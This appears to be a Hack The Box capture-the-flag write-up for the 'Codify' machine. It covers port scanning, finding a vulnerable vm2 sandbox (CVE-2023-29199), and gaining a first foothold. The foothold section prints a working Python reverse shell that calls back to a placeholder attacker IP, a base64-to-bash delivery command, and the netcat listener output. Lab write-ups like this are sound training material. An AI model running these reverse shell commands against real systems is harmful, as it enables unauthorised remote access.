![Codify](https://github.com/amalcew/htb-writeups/assets/73908014/b693185b-6355-4761-9f5c-902ed6282a52)

## Reconnaissance & port scanning

Initial port scan revealed open ports 22, 80 and 3000 used by some node.js instance

```bash
# Nmap 7.94SVN scan initiated Wed Mar  6 11:57:07 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.239
Nmap scan report for codify.htb (10.10.11.239)
Host is up, received syn-ack (0.066s latency).
Scanned at 2024-03-06 11:57:08 CET for 19s
Not shown: 992 closed tcp ports (conn-refused), 5 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Codify
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  6 11:57:27 2024 -- 1 IP address (1 host up) scanned in 19.26 seconds
```

After adding proper entry to `/etc/hosts` the webpage inspection was performed.

![01-codify](https://github.com/amalcew/htb-writeups/assets/73908014/8f00da85-db83-44fc-a081-b835f9aac67d)

![02-about](https://github.com/amalcew/htb-writeups/assets/73908014/e4ad795f-31e1-4be9-ac83-5bcd2f132ca6)

Apperantly, the machine hosts node.js sandbox using `vm2` library. Following the link we can discover, that the webpage leaks the version of the library, which is `3.9.16`.

Searching for potential vulnerabilities, I've came across [CVE-2023-29199](https://nvd.nist.gov/vuln/detail/CVE-2023-29199) that allows the threat actor to escape the vm2 sandbox by abusing the exception sanitization.
This behaviour was described in the [paper](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) that also explains simple proof of concept.

Checking the POC on tested website we can confirm, that the website is indeed vulnerable:

![03-rce](https://github.com/amalcew/htb-writeups/assets/73908014/d81c1d77-be96-4d5f-8f13-5824712f1ed3)

## Initial foothold

Because the website is vulnerable to remote code execution, next step is to gain initial foothold. 
The exploitation process was straightforward, as it required using proper reverse shell. In case of this machine, reverse shell was achieved using Python:

```bash
> cat reverse_shell.sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

> cat reverse_shell.sh | base64 -w 0
cHl0aG9u ... SNIP ... Il0pOycK
```

To execute this shell we need to decode it on the machine and execute, which makes the final payload:

```bash
echo cHl0aG9u ... SNIP ... Il0pOycK | base64 -d | /bin/bash;
```

Executing the payload on the machine we receive the connection on selected port:

![04-reverse_shell](https://github.com/amalcew/htb-writeups/assets/73908014/6a83a909-e7c8-4ea2-86c1-58f134d6167a)

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.239] 34166
bash: cannot set terminal process group (1254): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```
